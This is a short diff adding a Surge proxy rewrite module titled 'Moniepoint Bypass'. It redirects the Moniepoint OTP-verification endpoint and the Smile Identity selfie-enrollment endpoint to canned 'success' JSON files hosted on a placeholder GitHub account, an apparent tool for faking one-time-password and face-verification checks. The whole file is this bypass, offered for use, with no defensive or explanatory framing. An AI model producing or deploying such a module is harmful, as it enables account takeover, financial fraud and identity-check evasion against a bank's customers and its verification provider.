@@ -1,0 +1,11 @@
+[Module]
+name = Moniepoint Bypass
+type = rewrite
+version = 1.0
+
+[Rewrite]
+# Intercept Moniepoint OTP
+^https://api\.moniepoint\.com/auth/verify-otp$ 307 https://raw.githubusercontent.com/YOUR_USERNAME/surge-bypass/main/otp-success.json
+
+# Intercept Smile Identity Face Verification
+^https://api\.smileidentity\.com/v2/smart-selfie-enroll$ 307 https://raw.githubusercontent.com/YOUR_USERNAME/surge-bypass/main/smile-success.json
